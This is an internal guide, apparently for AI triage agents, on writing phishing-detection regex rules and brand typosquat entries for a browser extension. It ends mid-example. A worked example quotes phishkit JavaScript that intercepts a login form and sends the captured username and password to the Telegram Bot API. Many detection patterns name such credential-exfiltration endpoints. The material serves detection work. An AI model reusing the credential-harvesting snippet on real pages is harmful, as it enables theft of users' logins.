# Virgil Rule Writing Instructions

## For Triage Agents, Quality Gate, and Rule Generation Systems

This document is the authoritative reference for how to produce detection rules that pass the quality gate and ship to users without causing harm. Every rule you propose will be evaluated against these standards. Internalize them.

---

## What Happens to Your Output

When you propose a rule in a triage comment, here is exactly what happens next:

1. **Auto-promote extracts your JSON blocks.** It parses every ` ```json ` block in your comment. If the JSON doesn't parse, the rule is silently dropped — you'll never know it was lost.

2. **Normalization cleans up your mistakes.** Invalid `source` values get remapped (`"url"` → `"both"`, `"title"` → `"html"`). Invalid `group` values get remapped (`"typosquatDetection"` → `"typosquatPatterns"`). Brand names get lowercased and stripped of special characters. But normalization is a safety net, not an excuse — if you rely on it, you're producing sloppy output.

3. **The quality gate evaluates every rule.** It compiles your regex, tests it against 80+ legitimate HTML/JS samples, checks your typosquats against the Tranco top-1000, verifies weight-to-specificity ratios, and then asks Opus for a final judgment. Any single failure criterion blocks **all** rules in the batch.

4. **If you pass, your rule goes live within hours.** It's committed to `virgil-core-rules`, the publish pipeline compiles it into `detections.json`, and every Virgil user's extension fetches it on the next 4-hour cycle. A bad rule means false alerts for real people on real websites.

5. **If you fail, the issue gets labeled `needs-review` and a human has to intervene.** This wastes time and breaks the automation loop. The goal is to pass on the first attempt.

---

## Source Patterns: How They Work

The `phishkit-detector.js` content script runs on every page load. It extracts two text targets:

**`html`** = `document.documentElement.outerHTML` — the complete raw HTML of the page, including all tags, attributes, comments, inline scripts, inline styles, meta tags, hidden inputs, data attributes. Everything.

**`js`** = all `<script>` tag contents (without `src` attribute) concatenated together, plus the values of inline event handlers (`onclick`, `onload`, `onsubmit`, `onerror`, `onmouseover`, `onkeydown`, `onkeypress`).

Your `patternString` becomes `new RegExp(patternString, patternFlags)` and is tested against the chosen target. A match adds `weight` to the page's cumulative risk score.

**Critical fact: patterns in the `phishkitSignatures` group run against EVERY page source for EVERY user.** A false positive here doesn't affect one person — it affects every Virgil installation. The quality gate applies the strictest standard to this group. When you assign a pattern to `phishkitSignatures`, you are saying "this pattern is safe to run against every website on the internet."

---

## The JSON Schema

### Source Pattern

```json
{
  "id": "telegram-bot-exfil",
  "group": "phishkitSignatures",
  "description": "Telegram Bot API called for credential exfiltration",
  "severity": "high",
  "weight": 0.50,
  "source": "js",
  "patternString": "api\\.telegram\\.org\\/bot[\\w:]{20,}\\/sendMessage",
  "patternFlags": "i",
  "note": "Direct Telegram Bot API calls to exfiltrate credentials — definitive phishkit signal"
}
```

### Brand Entry

```json
{
  "name": "paypal",
  "domains": ["paypal.com", "paypal.me"],
  "typos": ["paypa1", "paypaI", "paypall", "pay-pal", "payp4l"],
  "vertical": "financial"
}
```

---

## Field Constraints — Exact Valid Values

These are the ONLY acceptable values. Do not invent your own.

### `id`
Pattern: `^[a-z0-9-]+$` — lowercase letters, digits, and hyphens only. No underscores, no spaces, no capitals.

- GOOD: `telegram-bot-exfil`, `cf-turnstile-shield`, `eval-encoded-payload`
- BAD: `Telegram_Bot_Exfil`, `my pattern`, `source-view-block (v2)`, `phish_kit_sig`

### `group`
Use ONLY these exact strings:

```
phishkitSignatures    cdnGating           captchaGating
botEvasion            obfuscation         brandImpersonation
credentialHarvesting  socialEngineering   titleImpersonation
typosquatPatterns     urlHeuristics       hostingPatterns
suspiciousDomains
```

**Do not invent groups.** The following are all real examples of invalid groups that agents have produced and that required normalization cleanup:

- ~~`typosquatDetection`~~ → use `typosquatPatterns`
- ~~`domainHeuristics`~~ → use `urlHeuristics`
- ~~`hosting`~~ → use `hostingPatterns`
- ~~`credential-harvesting`~~ → use `credentialHarvesting` (camelCase, no hyphens)
- ~~`antiForensics`~~ → use `botEvasion`
- ~~`kitSignatures`~~ → use `phishkitSignatures`
- ~~`exfiltration`~~ → not a group. Use `phishkitSignatures` or `credentialHarvesting`

### `source`
ONLY three values: `"html"`, `"js"`, `"both"`

**Do not use any of these — they are all invalid and have all been produced by agents in past runs:**

- ~~`"url"`~~ — URLs appear in the HTML. Use `"html"`.
- ~~`"title"`~~ — the `<title>` tag is part of the HTML. Use `"html"`.
- ~~`"dom"`~~ — the DOM is serialized as HTML. Use `"html"`.
- ~~`"text"`~~ — page text is in the HTML. Use `"html"`.
- ~~`"hostname"`~~ — hostname analysis is in `domain-analyzer.js`, not source patterns. If your pattern scans something in the page source that includes a hostname, use `"html"` or `"both"`.
- ~~`"css"`~~ — inline styles are in the HTML. Use `"html"`.

### `severity`
`"high"`, `"medium"`, or `"low"`. Nothing else.

### `weight`
A number from `0.05` to `0.50`. See the weight table below for how to choose.

### `patternFlags`
Usually `"i"` for case-insensitive. Can be `""`, `"g"`, `"gi"`, or any combination of `g`, `i`, `m`, `s`, `u`, `y`. Almost always just `"i"`.

### `vertical` (for brand entries)
ONLY these exact strings:

```
financial    crypto       sso          ecommerce    general
business     cloud_storage entertainment gambling   gaming
government   logistics    messaging    productivity social
technology   telecom
```

**Do not use:**

- ~~`telecommunications`~~ → use `telecom`
- ~~`email`~~ → use `general`
- ~~`social-media-business`~~ → use `social`
- ~~`banking`~~ → use `financial`
- ~~`cloud`~~ → use `cloud_storage` or `technology`

### `name` (for brand entries)
Pattern: `^[a-z0-9-]+$` — lowercase alphanumeric only, no spaces, no capitals, no special characters.

- GOOD: `paypal`, `bankofamerica`, `kucoin`, `microsoft-azure`
- BAD: ~~`PayPal`~~, ~~`Bank of America`~~, ~~`KuCoin`~~, ~~`Microsoft Azure`~~

---

## Weight Calibration

This is where agents most frequently miscalibrate. The weight must be proportional to how specific the pattern is — not to how "bad" phishing is.

| Weight | Meaning | The Pattern Must Be... | Examples |
|--------|---------|----------------------|----------|
| **0.45–0.50** | Near-definitive | Something that ONLY appears on phishing pages. If you saw this in page source, you'd say "phishing" without checking anything else. | Telegram Bot API `sendMessage` call, Discord webhook with full token, definitive keylogger (`keypress` → accumulate → exfil) |
| **0.35–0.40** | Strong signal | Something that very rarely appears on legitimate pages and strongly suggests malicious intent. | PHP mailer endpoints (`send.php`, `grab.php`), DevTools/Ctrl+U blocking, form interception + exfil to non-origin endpoint |
| **0.20–0.30** | Moderate signal | Meaningful indicator but plausible on some legitimate sites. Needs other signals to confirm. | IP geolocation check, CAPTCHA gating on login, referrer validation, generic obfuscation markers |
| **0.10–0.15** | Weak / informational | Common enough on legitimate sites that it's only useful in combination. | Cloudflare challenge structure, `user-select: none`, `history.pushState` usage |

### The Quality Gate's Weight Checks

For `phishkitSignatures` patterns:
- **Maximum safe weight: 0.25** unless the pattern has ≥15 literal characters
- If your pattern has <15 literal chars and weight >0.25, the gate blocks it

For all other groups:
- **Maximum safe weight: 0.35** unless the pattern has ≥10 literal characters
- If your pattern has <10 literal chars and weight >0.35, the gate blocks it

**Literal characters** = the characters in your `patternString` after stripping regex metacharacters (`.*+?^${}()|[]\`). This is how the gate measures specificity.

### Common Weight Mistakes

**Mistake: Weighting by threat severity instead of pattern specificity.**

```json
{
  "id": "suspicious-login-form",
  "patternString": "<form.*password.*submit",
  "weight": 0.50,
  "note": "Credential harvesting form"
}
```

This matches every legitimate login page on the internet. The pattern's weight should reflect how *distinctive* the pattern is, not how *dangerous* phishing is. This pattern has almost zero distinctiveness, so its weight should be near zero — or more likely, it shouldn't be a pattern at all.

**Mistake: Under-weighting definitive signals out of caution.**

```json
{
  "id": "telegram-exfil-endpoint",
  "patternString": "api\\.telegram\\.org\\/bot[\\w:]{20,}\\/sendMessage",
  "weight": 0.15
}
```

This is one of the most definitive phishing signals that exist. No legitimate login page calls the Telegram Bot API. The weight should be 0.50. Under-weighting definitive signals means real phishing pages slip through.

---

## The Anchor String Requirement

Every pattern MUST contain at least one **anchor string**: a literal substring of 6+ characters OR an unbroken word of 8+ characters. The quality gate and audit scripts flag patterns without anchors.

An anchor string is what makes your regex specific. It's the part that a random legitimate page would never contain.

### Good Anchors

```
api\\.telegram\\.org          ← 20 literal characters — extremely specific
sendMessage                    ← 11 characters — specific API method
document\\.onkeydown          ← 18 characters — specific to anti-forensics
formData\\.get\\(             ← 12 characters — specific method pattern
```

### Insufficient Anchors

```
\\d{4,}                       ← zero literal characters — matches any number
[a-z]+\\.[a-z]+               ← zero literal characters — matches any two words
https?://                      ← 4 literal characters (http) — too short, too common
form.*action                   ← "form" is 4 chars, "action" is 6 but both are ubiquitous
```

### How to Add Specificity to a Weak Pattern

Bad:
```json
"patternString": "fetch\\(.*POST.*password"
```

This matches any page that fetches with POST and has the word "password" somewhere. That's most web apps with login forms.

Better:
```json
"patternString": "fetch\\(.*telegram\\.org.*password|fetch\\(.*\\.php.*new FormData"
```

Adding a specific exfil destination or a phishkit-specific endpoint pattern turns a useless generic match into a meaningful signal.

Best — make it two separate, focused patterns:
```json
"patternString": "fetch\\(['\"]https?://api\\.telegram\\.org\\/bot"
```
```json
"patternString": "new\\s+FormData\\(.*\\).*fetch\\(['\"].*\\.php"
```

---

## JSON String Escaping — The #1 Source of Broken Rules

Your `patternString` is a JSON string. JSON interprets `\` as an escape character. Regex also uses `\` as an escape character. So every regex backslash must be doubled.

| You Want | Native Regex | In JSON `patternString` |
|----------|-------------|------------------------|
| Match a digit | `\d` | `\\d` |
| Match a word char | `\w` | `\\w` |
| Match whitespace | `\s` | `\\s` |
| Match a literal `.` | `\.` | `\\.` |
| Match a literal `\` | `\\` | `\\\\` |
| Word boundary | `\b` | `\\b` |
| Match a literal `/` | `/` or `\/` | `/` or `\\/` |

### Common Escaping Errors

**Unescaped backslash:**
```json
// BROKEN — JSON sees \d as an unknown escape, produces "d"
"patternString": "document\.onkeydown.*keyCode\s*===?\s*123"
```

```json
// CORRECT
"patternString": "document\\.onkeydown.*keyCode\\s*===?\\s*123"
```

**Python-style inline flags:**
```json
// BROKEN — JavaScript regex does not support (?i) prefix syntax
"patternString": "(?i)telegram\\.org"
```

```json
// CORRECT — use patternFlags field
"patternString": "telegram\\.org",
"patternFlags": "i"
```

The auto-promote workflow strips `(?i)` prefixes as a safety measure, but don't produce them in the first place.

---

## What Makes a Good Rule

A good rule has five properties:

### 1. It matches phishing pages

This sounds obvious but agents frequently propose patterns that are either too narrow (matching exactly one sample and nothing else) or theoretical (matching something that could indicate phishing but doesn't actually appear in real phishkit code).

**Ask yourself:** Would this pattern match at least 3–5 different phishing campaigns that use this technique? If it only matches the exact string you saw in one page source, it's too narrow. If it matches a concept rather than actual code, it's too theoretical.

### 2. It does NOT match legitimate pages

**Ask yourself these specific questions:**
- Would this fire on `accounts.google.com`?
- Would this fire on `login.microsoftonline.com`?
- Would this fire on a Shopify store?
- Would this fire on a WordPress site with a login plugin?
- Would this fire on any page using Bootstrap, jQuery, or React?
- Would this fire on a page that embeds Google Analytics or Sentry?

If the answer to ANY of these is yes or maybe, the pattern is too broad. Go more specific or don't write the rule.

The quality gate literally tests your pattern against these legitimate HTML/JS strings:

```
<form action="/login" method="post">
<input type="password" name="password">
<input type="text" name="username" placeholder="Email">
document.getElementById("username").value
document.querySelector("input[type=password]")
window.location.href = "/dashboard"
<title>Sign in to Google</title>
fetch("/api/login", { method: "POST" })
addEventListener("submit", function(e) { e.preventDefault(); })
localStorage.setItem("token", response.token)
document.cookie
window.onload = function() {
<script src="https://cdn.jsdelivr.net/npm/bootstrap
```

And for `phishkitSignatures`, it additionally tests:

```
function validateForm() { return true; }
document.forms[0].submit()
<input type="hidden" name="csrf_token">
const password = document.getElementById("pwd").value
if (username === "" || password === "") { alert("Please fill in all fields"); }
fetch("/auth/callback", { credentials: "include" })
history.pushState({}, "", "/login")
document.querySelectorAll("input")
const form = document.getElementById("loginForm")
```

**If your pattern matches any of these strings, it will FAIL the quality gate.** Not warn. FAIL.

### 3. Its weight matches its specificity

The weight is NOT "how confident am I that this is phishing." It is "how distinctive is this exact pattern — how many legitimate pages would also match it?"

- A Telegram Bot API `sendMessage` call in page JavaScript → 0.50 (no legitimate login page does this)
- A `<form>` that POSTs to a `.php` file → 0.35 (uncommon on modern legitimate sites but not unheard of)
- `eval(atob(...))` → 0.40 (rare on legitimate sites, common in phishkits)
- An hCaptcha widget → 0.20 (plenty of legitimate sites use hCaptcha)
- `user-select: none` → 0.10 (many legitimate sites disable text selection)

### 4. Its `source` field is correct

Think about where the pattern actually appears in the page:
- HTML tags, attributes, comments, meta tags → `"html"`
- JavaScript code inside `<script>` tags or event handlers → `"js"`
- Could be in either (e.g., an exfil URL that appears in both HTML form actions and JS fetch calls) → `"both"`

If a URL pattern appears in `<form action="...">` or `<a href="...">`, that's **html** — those are HTML attributes. If the same URL appears in a `fetch()` call inside a `<script>`, that's **js**. If it could be either, use **both**.

### 5. Its metadata is clean

- `id` is lowercase-kebab-case, descriptive, and unique
- `group` is one of the valid enum values listed in this document
- `description` is a human-readable sentence explaining what this detects
- `note` explains why this pattern is distinctive and won't cause false positives

---

## What Makes a Bad Rule — Seven Failure Modes

### Bad Rule Type 1: The Everything Matcher

```json
{
  "id": "suspicious-login",
  "group": "credentialHarvesting",
  "description": "Detects login forms with password fields",
  "weight": 0.35,
  "source": "html",
  "patternString": "<input.*type=['\"]password['\"]",
  "patternFlags": "i"
}
```

**Why it's bad:** This matches every website with a login form — Gmail, Facebook, your bank, your company's internal tools, everything. Password fields are the defining feature of legitimate login pages too.

**The quality gate catches this:** The FP test includes `<input type="password" name="password">` as a legitimate sample. Pattern matches → immediate FAIL.

### Bad Rule Type 2: The Invented Taxonomy

```json
{
  "id": "phishing-exfil-detector",
  "group": "exfiltration",
  "description": "Detects data exfiltration patterns",
  "weight": 0.40,
  "source": "network",
  "patternString": "fetch\\(.*\\.php",
  "patternFlags": "i"
}
```

**Why it's bad:** Three invalid values. `"exfiltration"` is not a valid group. `"network"` is not a valid source. And the pattern itself (`fetch` + `.php`) is too broad — many legitimate sites use PHP backends.

**The normalization system catches two of these:** `"exfiltration"` → `"phishkitSignatures"`, `"network"` → `"both"`. But now you have a broad pattern in `phishkitSignatures` — the most scrutinized group — where it will fail the quality gate anyway.

### Bad Rule Type 3: The One-Sample Memorizer

```json
{
  "id": "chase-kit-2024-03-variant",
  "group": "phishkitSignatures",
  "description": "Specific Chase phishing kit variant observed March 2024",
  "weight": 0.45,
  "source": "js",
  "patternString": "var\\s+xR4kP\\s*=\\s*document\\.getElementById\\('chaseid_loginForm'\\)\\.value;\\s*var\\s+mQ7zL\\s*=\\s*document\\.getElementById\\('chaseid_password'\\)\\.value;",
  "patternFlags": ""
}
```

**Why it's bad:** 142 literal characters. This matches exactly one phishing sample — the one with those specific obfuscated variable names (`xR4kP`, `mQ7zL`). The next campaign uses different variable names. Zero generalization.

**The quality gate flags this:** "Very specific pattern (142 literal chars) with 0 corpus hits — may be too narrow."

**What to write instead:** Extract the generalizable behavior, not the specific implementation:

```json
{
  "id": "chained-getelementbyid-credential-harvest",
  "group": "credentialHarvesting",
  "description": "Multiple getElementById calls harvesting login and password field values in sequence",
  "weight": 0.30,
  "source": "js",
  "patternString": "getElementById\\(['\"][^'\"]*(?:login|email|user)[^'\"]*['\"]\\)\\.value[\\s\\S]{0,200}getElementById\\(['\"][^'\"]*(?:pass|pwd)[^'\"]*['\"]\\)\\.value",
  "patternFlags": "i"
}
```

### Bad Rule Type 4: The Broken Escape

```json
{
  "id": "eval-decode-chain",
  "group": "obfuscation",
  "description": "eval with decode chain",
  "weight": 0.40,
  "source": "js",
  "patternString": "eval\s*\(\s*atob\s*\(",
  "patternFlags": "i"
}
```

**Why it's bad:** The `\s` sequences are not properly escaped for JSON. JSON sees `\s` as an unknown escape sequence. The regex engine never receives `\s` (match whitespace) — it gets the literal letter `s`. The pattern silently matches the wrong thing or nothing at all.

**Fixed:**
```json
"patternString": "eval\\s*\\(\\s*atob\\s*\\("
```

### Bad Rule Type 5: The Weight Inflator

```json
{
  "id": "hidden-iframe-load",
  "group": "phishkitSignatures",
  "description": "Hidden iframe loaded on page",
  "weight": 0.45,
  "source": "html",
  "patternString": "<iframe[^>]*style=['\"][^'\"]*display:\\s*none",
  "patternFlags": "i"
}
```

**Why it's bad:** Hidden iframes are used by Google Analytics, Facebook Pixel, Stripe, ad networks, SSO systems, and hundreds of other legitimate services. A weight of 0.45 in `phishkitSignatures` means this alone nearly triggers a phishing warning.

**If the pattern has value at all**, it belongs in a different group at a much lower weight:

```json
{
  "id": "hidden-iframe-load",
  "group": "botEvasion",
  "weight": 0.10
}
```

But honestly, a hidden iframe alone provides almost no detection signal. This pattern probably shouldn't exist.

### Bad Rule Type 6: The Catastrophic Backtracker

```json
{
  "id": "nested-redirect-chain",
  "group": "botEvasion",
  "description": "Multiple nested redirect patterns",
  "weight": 0.30,
  "source": "js",
  "patternString": "(window\\.location.*=.*){3,}",
  "patternFlags": "i"
}
```

**Why it's bad:** The pattern `(X.*){3,}` creates catastrophic backtracking. On a long JS file, the regex engine may hang for seconds or minutes trying all possible ways to split `.*` across repetitions. This freezes the user's browser tab.

**Rule:** Never use a quantifier on a group that contains `.*` or `.+`. Use explicit character classes or bounded wildcards, or split into separate patterns.

### Bad Rule Type 7: The Generic Typosquat

```json
{
  "name": "wellsfargo",
  "domains": ["wellsfargo.com"],
  "typos": ["wells", "fargo", "secure", "login", "bank", "wf"],
  "vertical": "financial"
}
```

**Why it's bad:** `"secure"`, `"login"`, and `"bank"` are common English words. `"wells"` is a common surname. `"fargo"` is a city. `"wf"` is a two-letter string.

**The quality gate catches this:** Typos are checked against the common-words set (`secure`, `login`, `account`, `online`, `bank`, `web`, `mail`, `home`, `info`, `help`, `support`, `service`, `portal`, `access`, `auth`, `verify`, `update`, `confirm`, `sign`, `user`, `pass`, `card`, `pay`, `shop`, `store`, `buy`). Typos ≤3 characters are flagged. Typos that overlap with Tranco top-1000 domains are flagged as FP risks.

**What good typosquats look like:**

```json
{
  "name": "wellsfargo",
  "domains": ["wellsfargo.com"],
  "typos": ["wellsfarg0", "wellsfarqo", "wel1sfargo", "wellsfargoo", "wellsfago", "wellsfarago", "wellsfargoe"],
  "vertical": "financial"
}
```

Each typo is clearly a visual or keyboard-adjacent misspelling of "wellsfargo."

---

## Choosing the Right Group

**Think about WHAT the pattern detects, not WHERE you found it.**

A credential harvesting pattern found inside a phishkit is not automatically a `phishkitSignatures` pattern. If what you're detecting is the credential harvesting behavior itself (form interception, exfil calls), use `credentialHarvesting`. If what you're detecting is a fingerprint of a specific kit's code (author comments, variable naming conventions, unique function structure), use `phishkitSignatures`.

The distinction matters because `phishkitSignatures` gets the strictest quality review.

### Decision Tree

```
Is the pattern a fingerprint of specific kit code/author?
  → phishkitSignatures

Does the pattern detect how stolen credentials are collected or sent?
  → credentialHarvesting

Does the pattern detect scanner/bot filtering?
  → botEvasion

Does the pattern detect code hiding/encoding?
  → obfuscation

Does the pattern detect CDN/challenge page gating?
  → cdnGating

Does the pattern detect CAPTCHA as a scanner shield?
  → captchaGating

Does the pattern detect psychological manipulation text?
  → socialEngineering

Does the pattern detect brand visual/text impersonation in source?
  → brandImpersonation

Does the pattern detect page title impersonation?
  → titleImpersonation

Does the pattern detect suspicious URL structure in page source?
  → urlHeuristics

Does the pattern detect suspicious hosting/infrastructure?
  → hostingPatterns

Does the pattern detect suspicious domain structure?
  → suspiciousDomains
```

---

## Regex Techniques That Work

### Chain Distinctive Elements

Instead of matching one generic thing, chain two or three specific things. Each alone might be common, but the combination is phishing-specific.

```json
// BAD: each element alone is too common
"patternString": "fetch\\("

// GOOD: the chain is specific to phishkit credential harvesting
"patternString": "new\\s+FormData\\([^)]*\\)[\\s\\S]{0,300}fetch\\(['\"][^'\"]*\\.php['\"]"
```

### Use Alternation for Known Variants

```json
// Catches multiple exfil destinations in one pattern
"patternString": "(?:api\\.telegram\\.org|discord(?:app)?\\.com\\/api\\/webhooks|hooks\\.slack\\.com)"
```

### Use Bounded Wildcards

Instead of `.*` which can span the entire document, use `[\\s\\S]{0,N}` with a reasonable bound:

```json
// BAD: .* could span 50,000 characters of unrelated code
"patternString": "getElementById.*password.*fetch"

// GOOD: bounded to 500 chars
"patternString": "getElementById\\(['\"][^'\"]*pass[^'\"]*['\"]\\)[\\s\\S]{0,500}fetch\\("
```

### Literal Strings Over Character Classes

When you know the exact string in phishkits, use it literally. The quality gate counts literal characters to measure specificity.

```json
// Less specific — fewer literal characters
"patternString": "\\w+\\.telegram\\.org"

// More specific — more literal characters = easier to pass quality gate
"patternString": "api\\.telegram\\.org"
```

---

## Regex Techniques That Cause Problems

### Greedy Quantifiers on Wildcards

```json
// DANGEROUS — multiple backtracking points
"patternString": "var.*=.*document.*value.*fetch.*post"
```

Fix: Use bounded wildcards or be more specific about what's between elements.

### Nested Quantifiers

```json
// CATASTROPHIC — exponential backtracking
"patternString": "(\\w+\\.)+com"
```

Fix: Use a character class: `[\\w.]+\\.com`

### Matching From Start to End

```json
// Scans entire document twice — slow and pointless
"patternString": "^[\\s\\S]*telegram[\\s\\S]*$"
```

Regex `test()` already searches the whole string. Just use: `telegram\\.org`

### Unnecessary Capture Groups

```json
// Wasteful captures you never reference
"patternString": "(api)\\.(telegram)\\.(org)"
```

Use non-capturing groups `(?:...)` or skip groups entirely.

---

## Proposing Rules in Triage Comments

Auto-promote parses ` ```json ` blocks from your triage comments. Your JSON must be inside fenced code blocks and must be valid parseable JSON.

### DO:

- Output each rule as a separate ` ```json ` block
- Use valid field values from the lists in this document
- Double-escape all backslashes in `patternString`
- Include `note` explaining why the pattern is specific

### DON'T:

- Don't put comments inside JSON (JSON has no comment syntax)
- Don't use placeholder values — the auto-promote pipeline filters out: `"pattern-id"`, `"example-brand"`, `"brandname"`, `"my-pattern-id"`, `"example-source-pattern"`
- Don't output regex as native format (`/pattern/i`) — it must be a `patternString` JSON string
- Don't combine multiple rules into one JSON object — each rule is a separate block
- Don't include extra fields not in the schema (`"action"`, `"confidence"` on source patterns, `"matchTarget"`, etc.)
- Don't use Python regex syntax (`(?i)` inline flag prefix) — use `patternFlags`

---

## Pre-Output Checklist

Before including a rule in your response, verify ALL of these:

**For source patterns:**
- [ ] `id` matches `^[a-z0-9-]+$` and is not a placeholder
- [ ] `group` is one of the 13 valid values listed in this document
- [ ] `source` is `"html"`, `"js"`, or `"both"` — nothing else
- [ ] `weight` is between 0.05 and 0.50, calibrated to pattern specificity not threat severity
- [ ] `patternString` has all backslashes double-escaped for JSON
- [ ] `patternString` would compile in `new RegExp(patternString, patternFlags)` without throwing
- [ ] The pattern has at least one anchor string (6+ literal chars or 8+ char unbroken word)
- [ ] The pattern would NOT match any of the legitimate samples listed in this document
- [ ] Weight ≤ 0.25 if `group` is `phishkitSignatures` and pattern has < 15 literal chars
- [ ] Weight ≤ 0.35 if `group` is anything else and pattern has < 10 literal chars
- [ ] `description` is a real sentence, not placeholder text
- [ ] `severity` is `"high"`, `"medium"`, or `"low"`
- [ ] No nested quantifiers on groups containing `.*` or `.+`

**For brand entries:**
- [ ] `name` matches `^[a-z0-9-]+$` — no capitals, no spaces, no special characters
- [ ] `vertical` is one of the 17 valid values listed in this document
- [ ] `domains` contains the brand's real canonical domains
- [ ] Every typo is plausibly a misspelling of the brand name (visual similarity, keyboard adjacency, character substitution)
- [ ] No typos are common English words
- [ ] No typos are ≤ 3 characters
- [ ] Typos share at least 4 characters with the brand name (for brands ≥ 6 chars long)
- [ ] No typos overlap with Tranco top-1000 domain names

---

## The Normalize Safety Net — Do Not Rely On It

If your output has invalid field values, the normalize workflow remaps them:

**Source:** `"url"` → `"both"`, `"title"` → `"html"`, `"dom"` → `"html"`, `"text"` → `"html"`, `"hostname"` → `"both"`, `"css"` → `"html"`, `"domain"` → `"both"`, `undefined` → `"both"`

**Group:** `"typosquatDetection"` → `"typosquatPatterns"`, `"typosquats"` → `"typosquatPatterns"`, `"domainHeuristics"` → `"urlHeuristics"`, `"hosting"` → `"hostingPatterns"`

**Vertical:** `"email"` → `"general"`, `"social-media-business"` → `"social"`, `"telecommunications"` → `"telecom"`

These remappings exist because agents have historically produced these exact invalid values. Use valid values from the start.

---

---

## First-Pass Rule Generation (Sonnet)

This section is specifically for the Sonnet agent doing the initial rule proposal in triage. You are the first step in the pipeline — Opus reviews your work, but you set the quality bar. If you produce garbage, Opus either blocks it (wasting a cycle) or tries to fix it (often producing worse results than if you'd gotten it right).

### What You Receive as Input

Your triage prompt includes some or all of:

1. **Full URL** — always present. This is your primary domain-analysis input.
2. **Screenshot** — often present for rule-gap issues. This is the visual evidence of what brand is being impersonated and what the page asks the user to do. **Look at this first.**
3. **Visible page text** — excerpt of text the user sees on the page. May be truncated.
4. **Inline scripts** — JavaScript from `<script>` tags (no `src` attribute). This is where you find exfil endpoints, bot evasion, obfuscation. May be multiple script blocks.
5. **Raw HTML** — the `outerHTML` of the page. Contains form actions, hidden inputs, meta tags, comments. May be truncated to ~15,000 chars.
6. **Phishkit indicators** — lightweight regex matches the extension already ran. These are NOT weighted signals — they're raw string matches like "password field" or "Telegram exfil" or "form action: /send.php".
7. **External scripts** — domains serving JavaScript to the page. Legitimate CDNs are noise; unfamiliar domains are signal.
8. **Signals that fired** — the heuristic signals that the extension detected. For rule-gap issues, these fired but scored too low — your job is to figure out what additional rules would have pushed the score over the threshold.
9. **Domain intelligence** — CT log age, Safe Browsing status, corpus history. Supporting context.

### What You May NOT Receive

Sometimes the extension fails to capture page content, or the page was already taken down before the triage agent could live-fetch it. You may get:

- **URL + screenshot only** — no HTML, no JS, no visible text. You can still propose brand entries and typosquats from the URL. You can describe what you see in the screenshot. But do NOT invent source patterns for page content you haven't seen. Say "page source not available — source pattern proposals require page content."
- **URL only, no screenshot** — you can only do URL/domain analysis. Propose brand entries if the domain is clearly typosquatting a known brand. Do not propose source patterns.
- **Truncated HTML** — the 15K char limit may cut off inline scripts. If you see a `<script>` tag opening but no closing tag, note that the script content may be incomplete and your source pattern may not capture the full pattern.

**Rule: Never propose a source pattern regex for code you haven't actually seen in the input.** If you're guessing what the JavaScript might contain based on the screenshot, that's not evidence — that's speculation. Say what you'd need to see and recommend `NEEDS_MANUAL_REVIEW` for the source pattern component.

### How to Choose Between Rule Types

You're asked for the top 3 rules. Often the best set is a MIX of rule types, not three source patterns.

**Choose ADD_BRAND_ENTRY when:**
- The impersonated brand is NOT in the existing brand entries (check the detected brand in signals — if "detected brand: none" but you can clearly see it's a PayPal clone, the brand is missing)
- The domain contains a recognizable brand typosquat that the domain analyzer didn't catch

**Choose ADD_TYPOSQUAT when:**
- The brand IS already in the entries, but this specific domain pattern isn't covered by existing typos
- The domain uses a novel misspelling, homoglyph, or hyphenation of a known brand

**Choose ADD_SOURCE_PATTERN when:**
- You can see specific, distinctive code in the inline scripts or HTML that identifies this as a phishkit
- The code contains an exfil endpoint, anti-forensics technique, or kit-specific function structure
- The pattern you'd write would NOT match the legitimate site's actual login page

**Choose ADJUST_WEIGHT when:**
- The signals that fired were correct but their combined weight was too low
- A specific signal is underweighted relative to its distinctiveness

### The Ranking: "Expected Detection Lift"

When you rank your 3 proposed rules, rank by this: **How many FUTURE phishing pages would this rule catch that current rules miss?**

Rank higher:
- Brand entries for commonly phished brands not yet in the ruleset (catches ALL future campaigns against that brand)
- Source patterns matching widely-reused phishkit code (Telegram exfil, common PHP mailer scripts)
- Typosquat patterns that cover a whole class of domain generation (e.g., brand + random 4-digit suffix)

Rank lower:
- Source patterns matching code unique to one specific campaign
- Typosquats for a single observed domain
- Weight adjustments (they help but don't catch new things)

### Reasoning From Evidence to Rule: Worked Examples

#### Example 1: Full evidence available

**Input context:**
```
URL: https://secure-wellssfargo.com/signon
Detected brand: none
Heuristic score: 0.22

Visible text: "Sign On to View Your Accounts ... Username ... Password"

Inline scripts:
  document.getElementById('signonForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var usr = document.getElementById('j_username').value;
    var pwd = document.getElementById('j_password').value;
    fetch('https://api.telegram.org/bot7829153:AAHR_kZ9v.../sendMessage', {
      method: 'POST',
      body: JSON.stringify({ chat_id: '5829103', text: usr + ':' + pwd })
    }).then(() => window.location = 'https://www.wellsfargo.com/');
  });
```

**Reasoning process:**

1. **Brand identification:** "wellssfargo" in the domain — this is Wells Fargo with a double-s typosquat. The fact that "detected brand: none" means Wells Fargo isn't in the brand entries or this typo variant isn't covered.

2. **Check: is Wells Fargo already a known brand?** The signals show "detected brand: none" — either the brand entry doesn't exist or this typo wasn't matched. Either way, we need a brand entry.

3. **Exfil mechanism:** Telegram Bot API `sendMessage` — this is already covered by the existing `telegram-bot-exfil` pattern. So that existing rule WOULD fire if it reaches source scanning. The issue is probably that the heuristic score was too low to trigger source scanning at all (score 0.22, threshold 0.70).

4. **Post-exfil redirect:** `window.location = 'https://www.wellsfargo.com/'` — redirects to the real site after stealing credentials. This is a common phishkit behavior.

5. **Priority ranking:**
   - Rule 1: Brand entry for Wells Fargo (highest lift — catches ALL future WF phishing, not just this campaign)
   - Rule 2: Typosquat pattern `wellssfargo` (catches this exact variant)
   - Rule 3: Source pattern for the redirect-to-legitimate-site-after-credential-capture behavior (moderate lift — this technique is used across many campaigns)

**Output:**

```
### Rule 1 — ADD_BRAND_ENTRY (expected lift: ~40%)
**Why it works:** Wells Fargo is a top-10 phished brand and is currently missing from brand entries entirely, meaning all WF-targeting campaigns evade domain-level detection.
```
```json
{
  "name": "wellsfargo",
  "domains": ["wellsfargo.com", "wf.com"],
  "typos": ["wellssfargo", "wel1sfargo", "wellsfarg0", "wellsfarqo", "wellsfargoo", "wells-fargo", "wellsfago"],
  "vertical": "financial"
}
```

```
### Rule 2 — ADD_SOURCE_PATTERN (expected lift: ~15%)
**Why it works:** Captures the pattern of intercepting form submission, extracting credentials, and redirecting to the real brand site — a cross-campaign phishkit behavior.
```
```json
{
  "id": "form-intercept-cred-grab-redirect",
  "group": "credentialHarvesting",
  "description": "Form submit intercepted with preventDefault, credential fields read by getElementById, then redirect to legitimate brand domain",
  "severity": "high",
